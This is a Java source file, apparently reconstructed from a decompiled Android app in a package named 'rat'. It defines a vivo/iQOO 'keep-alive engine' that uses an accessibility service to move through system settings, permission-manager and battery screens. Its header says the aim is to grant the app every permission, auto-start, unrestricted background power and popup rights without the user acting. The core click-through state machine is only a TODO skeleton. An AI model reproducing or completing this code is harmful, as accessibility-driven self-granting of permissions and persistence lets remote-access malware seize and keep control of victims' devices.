package com.vendor.rat.auto.engine;

import android.content.ComponentName;
import android.content.Intent;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import com.vendor.rat.auto.condition.CombineFilter;
import com.vendor.rat.auto.condition.StringCondition;
import com.vendor.rat.auto.entity.UiNode;
import com.vendor.rat.config.TextConfig;
import com.vendor.rat.service.MyAccessibilityService;

import java.util.ArrayList;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;
import java.util.concurrent.locks.ReentrantLock;

/**
 * Vivo 保活引擎
 *
 * Vendor: o/i0.java (684 行)
 * 功能: 在 vivo 设备上自动设置:
 *       1. 应用权限管理 → 全部权限
 *       2. 自启动管理 → 允许
 *       3. 后台耗电管理 → 不受限
 *       4. 弹窗权限 → 允许
 *       支持 com.android.settings / com.vivo.permissionmanager /
 *             com.vivo.abe / com.iqoo.powersaving
 *
 * 字段对齐:
 *   B     → SYNTHETIC_FLAG (static)
 *   A     → popupPermGranted (AtomicBoolean)
 *   f649r → keepAliveTarget (AtomicReference, KEEP_ALIVE_UNKNOWN/MAIN/BACKUP)
 *   f650s → currentStep (AtomicReference)
 *   f651t → autoStartEnabled (AtomicBoolean)
 *   f652u → permissionGranted (AtomicBoolean)
 *   f653v → mainRelateStart (AtomicBoolean, 默认 true)
 *   f654w → backupRelateStart (AtomicBoolean, 默认 true)
 *   f655x → mainFullBackground (AtomicBoolean)
 *   f656y → backupFullBackground (AtomicBoolean)
 *   f657z → batteryUnrestricted (AtomicBoolean)
 */
public class VivoKeepAliveEngine extends AutoEngine {

    private static final String TAG = "o.i0";

    private static final String SETTINGS = "com.android.settings";
    private static final String VIVO_PERM_MGR = "com.vivo.permissionmanager";
    private static final String VIVO_ABE = "com.vivo.abe";
    private static final String IQOO_POWER = "com.iqoo.powersaving";
    private static final String PERM_CONTROLLER = "com.android.permissioncontroller";

    // ADAPT: B → SYNTHETIC_FLAG
    public static final int SYNTHETIC_FLAG = 0;

    // ADAPT: A → popupPermGranted
    public final AtomicBoolean popupPermGranted;

    // ADAPT: f649r → keepAliveTarget
    public final AtomicReference<String> keepAliveTarget;

    // ADAPT: f650s → currentStep
    public final AtomicReference<String> currentStep;

    // ADAPT: f651t ~ f657z → 各状态标志
    public final AtomicBoolean autoStartEnabled;
    public final AtomicBoolean permissionGranted;
    public final AtomicBoolean mainRelateStart;
    public final AtomicBoolean backupRelateStart;
    public final AtomicBoolean mainFullBackground;
    public final AtomicBoolean backupFullBackground;
    public final AtomicBoolean batteryUnrestricted;

    public VivoKeepAliveEngine() {
        super(createListenWindows(), SETTINGS);
        this.keepAliveTarget = new AtomicReference<>("KEEP_ALIVE_UNKNOWN");
        this.currentStep = new AtomicReference<>(null);
        this.autoStartEnabled = new AtomicBoolean(false);
        this.permissionGranted = new AtomicBoolean(false);
        this.mainRelateStart = new AtomicBoolean(true);
        this.backupRelateStart = new AtomicBoolean(true);
        this.mainFullBackground = new AtomicBoolean(false);
        this.backupFullBackground = new AtomicBoolean(false);
        this.batteryUnrestricted = new AtomicBoolean(false);
        this.popupPermGranted = new AtomicBoolean(false);
        try {
            scheduler.schedule(() -> finish(), 120L, TimeUnit.SECONDS);
        } catch (Exception e) {
            Log.e(TAG, "Schedule timeout error", e);
        }
    }

    // ============ 静态窗口构建 ============

    /** ADAPT: d0(str) → createInstalledAppDetailsWindow */
    public static WindowMatcher createInstalledAppDetailsWindow() {
        return new WindowMatcher(SETTINGS, "com.vivo.settings.applications.InstalledAppDetailsTop")
                .addEventType(32).addEventType(16384);
    }

    /** ADAPT: c0(str) → createVivoSubSettingsWindow */
    public static WindowMatcher createVivoSubSettingsWindow() {
        return new WindowMatcher(SETTINGS, "com.vivo.settings.VivoSubSettings")
                .addEventType(32).addEventType(16384);
    }

    /** ADAPT: f0() → createSoftPermissionDetailWindow */
    public static WindowMatcher createSoftPermissionDetailWindow() {
        return new WindowMatcher(VIVO_PERM_MGR,
                "com.vivo.permissionmanager.activity.SoftPermissionDetailActivity")
                .addEventType(32).addEventType(16384);
    }

    /** ADAPT: g0() → createFrameLayoutWindow */
    public static WindowMatcher createFrameLayoutWindow() {
        return new WindowMatcher(SETTINGS, "android.widget.FrameLayout")
                .addEventType(32).addEventType(16384);
    }

    /** ADAPT: h0() → createManagePermissionsWindow */
    public static WindowMatcher createManagePermissionsWindow() {
        return new WindowMatcher(PERM_CONTROLLER,
                "com.android.permissioncontroller.permission.ui.ManagePermissionsActivity")
                .addEventType(32).addEventType(16384);
    }

    /** ADAPT: v0() → createVivoPermDialogWindow */
    public static WindowMatcher createVivoPermDialogWindow() {
        return new WindowMatcher(VIVO_PERM_MGR, "com.originui.widget.dialog.h")
                .addEventType(32).addEventType(16384);
    }

    /** ADAPT: B0() → createVivoAlertDialogWindow */
    public static WindowMatcher createVivoAlertDialogWindow() {
        return new WindowMatcher(VIVO_PERM_MGR, "android.app.AlertDialog")
                .addEventType(32).addEventType(16384);
    }

    /** ADAPT: x0() → createPowerRankWindow */
    public static WindowMatcher createPowerRankWindow() {
        return new WindowMatcher(IQOO_POWER,
                "com.iqoo.powersaving.fuelgauge.PowerRankActivity")
                .addEventType(32).addEventType(16384);
    }

    /** ADAPT: G0() → createExcessivePowerManagerWindow */
    public static WindowMatcher createExcessivePowerManagerWindow() {
        return new WindowMatcher(VIVO_ABE,
                "com.vivo.applicationbehaviorengine.ui.ExcessivePowerManagerActivity")
                .addEventType(32).addEventType(16384);
    }

    /** ADAPT: s0() → createIqooPowerManagerWindow */
    public static WindowMatcher createIqooPowerManagerWindow() {
        return new WindowMatcher(IQOO_POWER,
                "com.iqoo.powersaving.activity.ExcessivePowerManagerActivity")
                .addEventType(32).addEventType(16384);
    }

    /** ADAPT: F0() → createExcessivePowerDescWindow */
    public static WindowMatcher createExcessivePowerDescWindow() {
        return new WindowMatcher(VIVO_ABE,
                "com.vivo.applicationbehaviorengine.ui.ExcessivePowerDescriptionActivity")
                .addEventType(32).addEventType(16384);
    }

    /** ADAPT: r0() → createIqooPowerDescWindow */
    public static WindowMatcher createIqooPowerDescWindow() {
        return new WindowMatcher(IQOO_POWER,
                "com.iqoo.powersaving.activity.ExcessivePowerDescriptionActivity")
                .addEventType(32).addEventType(16384);
    }

    /** ADAPT: u0() → createListenWindows */
    public static List<WindowMatcher> createListenWindows() {
        List<WindowMatcher> list = new ArrayList<>();
        // ADAPT: vendor 添加 c.J() (settings 通用窗口)
        list.add(createInstalledAppDetailsWindow());
        list.add(createVivoSubSettingsWindow());
        list.add(createManagePermissionsWindow());
        list.add(createFrameLayoutWindow());
        list.add(createSoftPermissionDetailWindow());
        list.add(createVivoPermDialogWindow());
        list.add(createVivoAlertDialogWindow());
        list.add(createPowerRankWindow());
        list.add(createExcessivePowerManagerWindow());
        list.add(createIqooPowerManagerWindow());
        list.add(createExcessivePowerDescWindow());
        list.add(createIqooPowerDescWindow());
        return list;
    }

    // ============ 过滤器构建 ============

    /** ADAPT: D0() → createAllPermissionFilter */
    public CombineFilter createAllPermissionFilter() {
        return buildTextViewFilter("VIVO_APP_ALL_PERMISSION_TEXT");
    }

    /** ADAPT: E0() → createBackgroundPowerFilter */
    public CombineFilter createBackgroundPowerFilter() {
        return buildTextViewFilter("VIVO_BACKGROUND_POWER_MANAGER_TEXT");
    }

    /** ADAPT: H0() → createAppPermissionFilter */
    public CombineFilter createAppPermissionFilter() {
        return buildTextViewFilter("VIVO_APP_PERMISSION_TEXT");
    }

    /** ADAPT: b0() → createAllowButtonFilter */
    public CombineFilter createAllowButtonFilter() {
        return buildTextViewFilter("VIVO_ALLOW_TEXT");
    }

    /** ADAPT: C0() → createAllOptFilter */
    public static CombineFilter createAllOptFilter() {
        return CombineFilter.and(
                StringCondition.className("android.widget.RelativeLayout"),
                new StringCondition(StringCondition.Property.VIEW_ID,
                        ":id/all_opt", StringCondition.MatchType.ENDS_WITH));
    }

    /** ADAPT: i0() → createAutoStartFilter */
    public CombineFilter createAutoStartFilter() {
        return buildTextViewFilter("VIVO_AUTO_START_TEXT");
    }

    /** ADAPT: w0() → createPopupInBackgroundFilter */
    public CombineFilter createPopupInBackgroundFilter() {
        return buildTextViewFilter("VIVO_POPUP_IN_BACKGROUND_TEXT");
    }

    // ============ 窗口检测方法 ============

    /** ADAPT: j0() → isInAppDetailWindow */
    public boolean isInAppDetailWindow() {
        List<WindowMatcher> list = new ArrayList<>();
        list.add(createInstalledAppDetailsWindow());
        list.add(createVivoSubSettingsWindow());
        return matchesAny(list);
    }

    /** ADAPT: k0() → isInAppPermissionDetailWindow */
    public boolean isInAppPermissionDetailWindow() {
        List<WindowMatcher> list = new ArrayList<>();
        list.add(createSoftPermissionDetailWindow());
        return matchesAny(list);
    }

    /** ADAPT: l0() → isInAppPermissionManageWindow */
    public boolean isInAppPermissionManageWindow() {
        List<WindowMatcher> list = new ArrayList<>();
        list.add(createManagePermissionsWindow());
        list.add(createFrameLayoutWindow());
        return matchesAny(list);
    }

    /** ADAPT: m0() → isInAppPowerDescWindow */
    public boolean isInAppPowerDescWindow() {
        List<WindowMatcher> list = new ArrayList<>();
        list.add(createExcessivePowerDescWindow());
        list.add(createIqooPowerDescWindow());
        return matchesAny(list);
    }

    /** ADAPT: n0() → isInPowerManagerWindow */
    public boolean isInPowerManagerWindow() {
        List<WindowMatcher> list = new ArrayList<>();
        list.add(createExcessivePowerManagerWindow());
        list.add(createIqooPowerManagerWindow());
        return matchesAny(list);
    }

    // ============ 执行入口 ============

    @Override
    public void execute() {
        // ADAPT: vendor 无独立 execute，由 onAccessibilityEvent 驱动
    }

    @Override
    public void onWindowMatched(String packageName, String className,
                                AccessibilityEvent event) {
        // ADAPT: 由 onAccessibilityEvent 状态机驱动
    }

    /** ADAPT: A0() → openPowerRankActivity */
    public boolean openPowerRankActivity() {
        try {
            MyAccessibilityService service = MyAccessibilityService.getInstance();
            if (service == null) return false;
            ComponentName cn = new ComponentName(IQOO_POWER,
                    "com.iqoo.powersaving.fuelgauge.PowerRankActivity");
            Intent intent = new Intent();
            intent.setComponent(cn);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
            intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK);
            currentStep.set("prepareInAppPowerRank");
            service.startActivity(intent);
            Log.d(TAG, "已启动耗电管理");
            return true;
        } catch (Exception e) {
            Log.e(TAG, "耗电管理启动失败", e);
            return false;
        }
    }

    // ============ 生命周期 ============

    /** ADAPT: Z() → finish (override) */
    @Override
    public void finish() {
        if (lock.tryLock()) {
            try {
                if (!isFinished()) {
                    Log.d(TAG, "准备结束本地保活自动化引擎");
                    updateProgress(100);
                    // ADAPT: vendor 调用 X() 清理黑屏, P().x() 恢复
                    scheduler.shutdownNow();
                    stateQueue.clear();
                    // ADAPT: vendor 检查 PIP 模式
                    Log.d(TAG, "已结束本地保活自动化引擎");
                    super.finish();
                }
            } catch (Exception e) {
                Log.e(TAG, "finish error", e);
            } finally {
                lock.unlock();
            }
        }
    }

    // ============ 事件处理 ============

    /**
     * ADAPT: u() → onAccessibilityEvent
     * // TODO: VENDOR_VERIFY - vendor 有复杂的状态机，此处为骨架
     */
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event, String packageName,
                                     String className) {
        super.onAccessibilityEvent(event, packageName, className);
        // TODO: VENDOR_VERIFY - 需要完整实现 vivo 保活状态机
        // vendor 状态机包含: 应用详情→权限管理→自启动→后台耗电→弹窗权限
    }

    // ============ singleton pattern ============

    @Override
    public boolean equals(Object obj) { return obj instanceof VivoKeepAliveEngine; }

    @Override
    public int hashCode() { return Objects.hash(VivoKeepAliveEngine.class.getName()); }
}
